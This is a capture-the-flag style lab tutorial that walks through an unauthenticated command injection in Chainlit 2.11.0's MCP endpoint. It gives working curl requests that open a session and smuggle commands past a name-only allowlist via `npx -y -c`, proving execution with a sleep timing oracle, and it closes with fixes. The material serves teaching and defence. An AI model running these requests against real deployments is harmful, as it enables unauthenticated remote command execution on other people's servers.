# Lab: The Allowlist That Only Read the First Word (CVE-2026-45018)

A company runs an AI chat app with a feature called MCP that lets the AI
launch helper programs. There is a guard: only approved programs may run.
Your job: show the guard checks the program's name and nothing else — then
run whatever you want through it.

*Time: ~30–45 min · Level: Intermediate · Needs: Docker + a web browser*

## What you'll learn

- How allowlist validation fails when it checks the name but not the rest
- The difference between fail-open and fail-closed defaults
- How WebSocket sessions get created, and what happens when the client
  picks its own session ID
- How to prove blind command execution with a timing oracle
- Why you verify advisory claims instead of trusting them

## Key ideas

- **Chainlit** — a framework for building AI chat apps in Python. The chat
  page you see is its UI.
- **MCP** — a protocol that lets the AI use external tools. One transport,
  called stdio, works by launching a program on the server.
- **Allowlist** — a list of permitted programs. The idea: if it's not on
  the list, it doesn't run.
- **Command injection** — smuggling your own command inside input the
  program trusts.
- **Timing oracle** — proving a command ran by measuring how long the
  server takes, when you can't see its output.

## Your target

One container: **Chainlit 2.11.0**, port **8000**, running as the
unprivileged user `labuser`. Its MCP feature is switched on, with `npx`
on the allowed list. No login exists — the app is open by design, and the
MCP endpoint is where the bug lives.

## Setup

```bash
docker compose up -d --build
```

Check it's up:

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8000/
```

```
200
```

## Task 1 — Look around

**Goal:** map what answers without credentials.

```bash
curl -s http://localhost:8000/ | grep -o '<title>[^<]*'
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8000/mcp
```

```
<title>Assistant
200
```

Open `http://localhost:8000` in a browser: a chat UI titled Assistant. And
`/mcp` answers `200` to a bare GET — the endpoint exists and nothing asked
who you are.

**Try the obvious wrong thing now:** POST anything to `/mcp` with a made-up
session ID:

```bash
curl -s -X POST 'http://localhost:8000/mcp' \
  -H 'Content-Type: application/json' \
  -d '{"sessionId": "nope", "clientType": "stdio", "name": "x", "fullCommand": "id"}'
```

```
Internal Server Error
```

A `500`, not a refusal. The endpoint is real, it tried to do something,
and it choked. Error messages are information — remember this one.

## Task 2 — Research the app

**Goal:** find out what's publicly known about Chainlit's MCP feature.

You know the app (Chainlit) and the suspicious endpoint (`/mcp`). Search
CVE databases and security writeups for Chainlit MCP vulnerabilities:

You will find CVE-2026-45018, and the reports agree on the claim:

- `POST /mcp` accepts a `fullCommand` string for stdio transport
- the check looks only at the program name, never the arguments
- `npx -y -c '...'` passes the check while running anything
- no authentication required; fixed in 2.12.0

Treat that as a hypothesis. Your target runs 2.11.0 with MCP on, which
matches — but matching isn't proof. The proof is Tasks 3 through 6.

## Task 3 — Read the server's complaint

**Goal:** learn why the blind attempt failed, using logs you own.

This box is yours, so its logs are yours:

```bash
docker compose logs --tail 5
```

Buried in the traceback:

```
ValueError: Session not found
```

The endpoint needs a session first, and your made-up ID matched nothing.
So the next question answers itself: how does a session get made — and can
you make one without credentials? That's Task 4.

## Task 4 — Open your own session

**Goal:** create a valid session through the app's own socket, no login.

Chainlit's chat runs on Socket.IO, which starts with plain HTTP polling.
First request asks for a channel:

```bash
curl -s 'http://localhost:8000/ws/socket.io/?EIO=4&transport=polling'
```

```
0{"sid":"eKzSQPxMTMXi5wf2AAAA",...}
```

Copy the `sid` value — you will use it twice. (Yours will differ; that's
fine.) Now send the connect packet. You choose the session ID yourself —
any string works:

```bash
SID=<paste your sid here>
curl -s -X POST "http://localhost:8000/ws/socket.io/?EIO=4&transport=polling&sid=$SID" \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  --data-binary '40{"sessionId":"lab-1","clientType":"webapp","userEnv":"{}"}'
```

```
OK
```

Confirm it landed:

```bash
curl -s "http://localhost:8000/ws/socket.io/?EIO=4&transport=polling&sid=$SID"
```

```
40{"sid":"..."}
```

A `40` reply means connected. Session `lab-1` now exists on the server,
created by you, no login involved. Include the fields exactly as shown —
leaving out `userEnv` breaks session creation entirely.

## Task 5 — Rejected versus executed

**Goal:** show the guard checks names, not commands.

Two attempts, same endpoint, same session. First, a program that is not on
the allowed list:

```bash
curl -s -w '\n[%{http_code}]\n' -X POST 'http://localhost:8000/mcp' \
  -H 'Content-Type: application/json' \
  -d '{"sessionId": "lab-1", "clientType": "stdio", "name": "a", "fullCommand": "sh -c '"'"'id'"'"'"}'
```

```
Internal Server Error
[500]
```

Blocked — `sh` isn't approved. Now the same idea through the approved name,
with the payload riding in the unchecked arguments:

```bash
curl -s -w '\n[%{http_code}]\n' -X POST 'http://localhost:8000/mcp' \
  -H 'Content-Type: application/json' \
  -d '{"sessionId": "lab-1", "clientType": "stdio", "name": "b", "fullCommand": "npx -y -c '"'"'id'"'"'"}'
```

```
{"detail":"Could not connect to the MCP: Connection closed"}
[400]
```

Different status, different meaning. The `500` says "rejected". The `400`
says the command *launched* and the handshake failed afterward. The guard
read `npx`, approved it, and never looked at the rest.

## Task 6 — Prove it blind

**Goal:** prove commands execute when you can't see their output.

You never see what the command prints — so make time itself the witness.
If `sleep 8` runs, the request takes ~8 seconds:

```bash
time curl -s -o /dev/null -w '[%{http_code}]\n' --max-time 30 -X POST 'http://localhost:8000/mcp' \
  -H 'Content-Type: application/json' \
  -d '{"sessionId": "lab-1", "clientType": "stdio", "name": "c", "fullCommand": "npx -y -c '"'"'sleep 8'"'"'"}'
```

```
[400]

real    0m8.6s
```

Eight-point-six seconds for a request that should be instant. The server
slept on your behalf. That is blind command execution, proven with a
stopwatch — the standard move whenever output doesn't come back.

## Task 7 — Take the trophy

**Goal:** get command output where you can read it.

Have the command write to a file, then read the file from the container
(this box is yours; looking inside it is fair):

```bash
curl -s -o /dev/null -X POST 'http://localhost:8000/mcp' \
  -H 'Content-Type: application/json' \
  -d '{"sessionId": "lab-1", "clientType": "stdio", "name": "d", "fullCommand": "npx -y -c '"'"'id > /tmp/pwned'"'"'"}'
docker compose exec vulnerable cat /tmp/pwned
```

```
uid=1000(labuser) gid=1000(labuser) groups=1000(labuser)
```

Commands run as the app's own user, with no credentials sent at any point
in this lab.

## What happened

The MCP check validates only the executable name against the allowed list
and passes the arguments through untouched — so `npx -y -c 'anything'`
sails through. Two compounding mistakes made it worse: an unset allowlist
permits *every* program instead of none (fail-open default), and the
feature runs with no authentication in front of it. Version 2.12.0 fixed it
by removing client-supplied commands entirely — servers are now defined by
name, server-side.

For real systems:

- Validate the whole input, never just the first word of it. Name-only
  checks on commands, paths, and URLs fail the same way everywhere.
- Defaults must deny. An empty allowlist meaning "allow everything" is a
  vulnerability on its own.
- Optional dangerous features need the same auth as everything else. "Off
  by default" only protects the people who never turned it on.

## Questions and answers

**Why did `sh` fail but `npx -y -c` work?**
The check compares the program name to the allowed list. `sh` isn't on it;
`npx` is. Everything after the name is never inspected, so `-y -c` plus an
arbitrary command rides through untouched.

**What do the `500` and the `400` each mean?**
`500` is the guard rejecting (or the server choking on) your input.
`400` "Could not connect" means your command launched and the MCP
handshake failed afterward. Different failures, different stages.

**Why the `sleep` trick?**
Because you never see command output through this endpoint. A delay you
control, measured with `time`, proves execution without needing output.

**What is the fix in one sentence?**
Stop accepting client-supplied commands; define MCP servers by name on the
server side, as Chainlit 2.12.0 does.

## Cleanup

```bash
docker compose down
```
